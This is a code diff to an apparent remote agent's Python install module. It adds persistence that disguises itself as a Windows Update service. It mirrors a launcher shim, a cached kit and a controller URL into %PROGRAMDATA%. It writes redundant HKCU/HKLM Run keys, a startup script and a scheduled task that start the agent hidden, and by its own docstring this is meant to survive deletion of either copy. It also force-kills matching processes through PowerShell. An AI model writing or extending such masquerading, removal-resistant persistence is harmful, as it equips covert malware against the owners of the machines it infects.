@@ -5,7 +5,7 @@ them by hand takes real effort, which is the point.
 """
 
 from __future__ import annotations
-from .. import guardian
+from .. import guardian, config
 
 import os
 import shutil
@@ -108,24 +108,90 @@ def interpreter_for(entry: str) -> str:
 # --------------------------------------------------------------------------
 
 
+def _public_url() -> str:
+    try:
+        from .. import config
+        return config.PUBLIC_URL or str(_deploy_url())
+    except Exception:
+        return ""
+
+
+def _deploy_url() -> str:
+    try:
+        import json
+        with open(os.path.join(stealth.bundle_root(), "deploy.json"),
+                  "r", encoding="utf-8-sig") as handle:
+            return json.load(handle).get("url", "")
+    except Exception:
+        return ""
+
+
+def _write_anchor() -> list[str]:
+    """Mirror the shim, the cached kit and the controller URL into %PROGRAMDATA%."""
+    if not IS_WINDOWS:
+        return []
+    anchor = stealth.anchor_directory()
+    if os.path.abspath(anchor) == os.path.abspath(stealth.primary_directory()):
+        return []
+    written: list[str] = []
+    try:
+        os.makedirs(anchor, exist_ok=True)
+    except OSError:
+        return []
+
+    source = _shim_source()
+    if source:
+        try:
+            shutil.copy2(source, stealth.anchor_shim_path())
+            written.append("anchor shim")
+        except OSError:
+            pass
+
+    for name, target in (("kit.zip", stealth.anchor_kit_path()),):
+        candidate = os.path.join(stealth.primary_directory(), name)
+        if os.path.isfile(candidate) and not os.path.isfile(target):
+            try:
+                shutil.copy2(candidate, target)
+                written.append("anchor kit")
+            except OSError:
+                pass
+
+    url = _public_url()
+    if url:
+        try:
+            with open(stealth.anchor_url_path(), "w", encoding="ascii") as handle:
+                handle.write(url)
+            written.append("anchor url")
+        except OSError:
+            pass
+    return written
+
+
+def _shim_source() -> str:
+    from .. import config
+    for candidate in (
+        os.path.join(stealth.bundle_root(), "install", "wu.cmd"),
+        os.path.join(stealth.primary_directory(), "install", "wu.cmd"),
+        os.path.join(config.ROOT, "install", "wu.cmd"),
+    ):
+        if os.path.isfile(candidate):
+            return candidate
+    return ""
+
+
 def _write_shim() -> str:
     """Ensure WindowsUpdateService.cmd shim exists in primary directory."""
     if not IS_WINDOWS:
         return ""
-    shim = stealth.shim_path()
-    try:
-        os.makedirs(os.path.dirname(shim), exist_ok=True)
-        # Look for wu.cmd in bundle root install/wu.cmd
-        for candidate in (
-            os.path.join(stealth.bundle_root(), "install", "wu.cmd"),
-            os.path.join(stealth.primary_directory(), "install", "wu.cmd"),
-            os.path.join(config.ROOT, "install", "wu.cmd"),
-        ):
-            if os.path.isfile(candidate):
-                shutil.copy2(candidate, shim)
-                return shim
-    except Exception:
-        pass
+    src = _shim_source()
+    if src:
+        target = stealth.shim_path()
+        try:
+            os.makedirs(os.path.dirname(target), exist_ok=True)
+            shutil.copy2(src, target)
+            return target
+        except Exception:
+            pass
     return ""
 
 
@@ -145,56 +211,94 @@ def _cache_kit() -> str:
         return ""
 
 
+def _run_commands() -> dict[str, str]:
+    """value_name -> command.  Value 0 uses the anchor, value 1 the user copy,
+    so deleting either location still leaves a working autostart."""
+    from .. import config
+    launcher = primary_launcher()
+    fallback = f'"{interpreter_for(launcher)}" "{launcher}" --hidden'
+    anchor = stealth.anchor_shim_path()
+    primary = stealth.shim_path()
+    commands = {}
+    for index, name in enumerate(config.RUN_VALUE_NAMES):
+        shim = anchor if index == 0 else primary
+        commands[name] = f'cmd.exe /c "{shim}"' if os.path.isfile(shim) else fallback
+    return commands
+
+
 def _reassert_run_keys() -> list[str]:
-    """Compare winreg QueryValueEx to expected command and rewrite only on mismatch."""
+    """Rewrite Run values only when they are missing or wrong.  Creates the key."""
     if not IS_WINDOWS:
         return []
     import winreg
-    from .. import config
 
-    shim = stealth.shim_path()
-    launcher = primary_launcher()
-    expected = f'"{shim}"' if os.path.isfile(shim) else f'"{interpreter_for(launcher)}" "{launcher}" --hidden'
+    expected = _run_commands()
     roots = [(winreg.HKEY_CURRENT_USER, "HKCU")]
     if stealth.is_admin():
         roots.append((winreg.HKEY_LOCAL_MACHINE, "HKLM"))
 
     actions = []
     for root, label in roots:
-        for value_name in config.RUN_VALUE_NAMES:
+        for value_name, command in expected.items():
             try:
-                key = winreg.OpenKey(root, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_READ | winreg.KEY_SET_VALUE)
+                key = winreg.CreateKeyEx(
+                    root, r"Software\Microsoft\Windows\CurrentVersion\Run",
+                    0, winreg.KEY_READ | winreg.KEY_SET_VALUE)
                 with key:
                     try:
-                        val, _ = winreg.QueryValueEx(key, value_name)
+                        current, _ = winreg.QueryValueEx(key, value_name)
                     except FileNotFoundError:
-                        val = None
-                    if val != expected:
-                        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, expected)
-                        actions.append(f"reasserted {label}\Run\{value_name}")
+                        current = None
+                    if current != command:
+                        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, command)
+                        actions.append(f"reasserted {label}\\Run\\{value_name}")
             except OSError:
                 pass
     return actions
 
-
 def _write_run_keys(launcher: str) -> list[str]:
-    """Create the HKCU and (when possible) HKLM Run entries."""
     import winreg
-    from .. import config
-
-    command = f'"{interpreter_for(launcher)}" "{launcher}" --hidden'
     written = []
-
+    commands = _run_commands()
     for root, label in ((winreg.HKEY_CURRENT_USER, "HKCU"),
                         (winreg.HKEY_LOCAL_MACHINE, "HKLM")):
-        for value_name in config.RUN_VALUE_NAMES:
+        for value_name, command in commands.items():
             try:
-                key = winreg.CreateKey(root, r"Software\Microsoft\Windows\CurrentVersion\Run")
+                key = winreg.CreateKeyEx(
+                    root, r"Software\Microsoft\Windows\CurrentVersion\Run",
+                    0, winreg.KEY_SET_VALUE)
                 winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, command)
                 written.append(f"{label}\\Run\\{value_name}")
             except OSError:
                 continue
     return written
+
+def purge() -> list[str]:
+    """Hard removal: remove everything including %PROGRAMDATA% anchor, runtime, deploy, and adopted states."""
+    removed = remove(keep_anchor=False)
+    if IS_WINDOWS:
+        removed += guardian.remove()
+        anchor = stealth.anchor_directory()
+        if os.path.isdir(anchor):
+            try:
+                shutil.rmtree(anchor, ignore_errors=True)
+                removed.append(f"removed anchor: {anchor}")
+            except OSError:
+                pass
+
+    for directory in stealth.install_directories():
+        for extra in ("runtime", "deploy.json", "adopted.json", "url.txt", "tombstone"):
+            path = os.path.join(directory, extra)
+            try:
+                if os.path.isdir(path):
+                    shutil.rmtree(path, ignore_errors=True)
+                    removed.append(f"purged {path}")
+                elif os.path.isfile(path):
+                    os.remove(path)
+                    removed.append(f"purged {path}")
+            except OSError:
+                pass
+    return removed
 
 
 def config_value_names() -> tuple[str, ...]:
@@ -213,10 +317,12 @@ def _write_startup_script(launcher: str) -> str:
     if not os.path.isdir(folder):
         return ""
     path = os.path.join(folder, config.PRODUCT_NAME + ".cmd")
+    shim = stealth.anchor_shim_path() if os.path.isfile(stealth.anchor_shim_path()) else stealth.shim_path()
+    cmd = f'cmd.exe /c "{shim}"' if os.path.isfile(shim) else f'"{interpreter_for(launcher)}" "{launcher}" --hidden'
     script = (
         "@echo off\r\n"
         "ping -n 12 127.0.0.1 >nul\r\n"
-        f'start "" "{interpreter_for(launcher)}" "{launcher}" --hidden\r\n'
+        f'start "" {cmd}\r\n'
     )
     try:
         with open(path, "w", encoding="utf-8", newline="") as handle:
@@ -229,8 +335,9 @@ def _write_startup_script(launcher: str) -> str:
 def _write_scheduled_task(launcher: str) -> str:
     """Create a logon and startup task."""
     from .. import config
-    shim = stealth.shim_path()
-    command = f'"{shim}"' if os.path.isfile(shim) else f'"{interpreter_for(launcher)}" "{launcher}" --hidden'
+    anchor = stealth.anchor_shim_path()
+    shim = anchor if os.path.isfile(anchor) else stealth.shim_path()
+    command = f'cmd.exe /c "{shim}"' if os.path.isfile(shim) else f'"{interpreter_for(launcher)}" "{launcher}" --hidden'
     rl_level = "HIGHEST" if stealth.is_admin() else "LIMITED"
     try:
         subprocess.run(
@@ -314,6 +421,7 @@ def install() -> list[str]:
 
     if IS_WINDOWS:
         _write_shim()
+        _write_anchor()
         _cache_kit()
         actions += _write_run_keys(launcher)
         if _write_startup_script(launcher):
@@ -344,6 +452,8 @@ def ensure() -> list[str]:
         if not os.path.isfile(stealth.shim_path()):
             _write_shim()
             actions.append("recreated shim")
+        if not os.path.isfile(stealth.anchor_shim_path()):
+            actions += _write_anchor()
         if not os.path.isfile(stealth.kit_cache_path()):
             _cache_kit()
             actions.append("recached kit")
@@ -411,17 +521,16 @@ def terminate_running_instances(exclude_pid: int = 0) -> list[int]:
     if IS_WINDOWS:
         try:
             ps_cmd = (
-                f"$cur = {exclude_pid}; "
+                f"$cur = {exclude_pid}; $self = $PID; "
                 "Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object { "
-                "$_.ProcessId -ne $cur -and ("
-                "$_.CommandLine -like '*WindowsUpdateService*' -or "
+                "$_.ProcessId -ne $cur -and $_.ProcessId -ne $self -and ("
                 "$_.CommandLine -like '*WindowsUpdate*' -or "
-                "$_.ExecutablePath -like '*WindowsUpdate*' -or "
-                "($_.CommandLine -like '*agent.py*' -and $_.CommandLine -notlike '*--uninstall*' -and $_.CommandLine -notlike '*--remove*') "
+                "($_.CommandLine -like '*agent.py*' -and "
+                "$_.CommandLine -notlike '*--uninstall*' -and "
+                "$_.CommandLine -notlike '*--purge*') "
                 ") } | ForEach-Object { "
                 "Write-Output $_.ProcessId; "
-                "Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue "
-                "}"
+                "Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }"
             )
             res = subprocess.run(
                 ["powershell", "-NoProfile", "-NonInteractive", "-Command", ps_cmd],
@@ -443,13 +552,14 @@ def terminate_running_instances(exclude_pid: int = 0) -> list[int]:
     return killed_pids
 
 
-def remove() -> list[str]:
+def remove(keep_anchor: bool = False) -> list[str]:
     """Undo everything :func:`install` did and stop all running processes."""
     from .. import config
     removed: list[str] = []
 
     if IS_WINDOWS:
-        removed += guardian.remove()
+        if not keep_anchor:
+            removed += guardian.remove()
         removed += guardian.clear_startup_approved()
 
     # 1. Terminate all running agent/watchdog processes
@@ -499,7 +609,12 @@ def remove() -> list[str]:
                 pass
 
     # 3. Clean install directories
+    anchor = os.path.abspath(stealth.anchor_directory())
     for directory in stealth.install_directories():
+        if keep_anchor and os.path.abspath(directory) == anchor:
+            continue
+        if not keep_anchor and os.path.abspath(directory) == anchor:
+            continue          # anchor is removed by purge() only
         if os.path.isdir(directory):
             try:
                 shutil.rmtree(directory, ignore_errors=True)
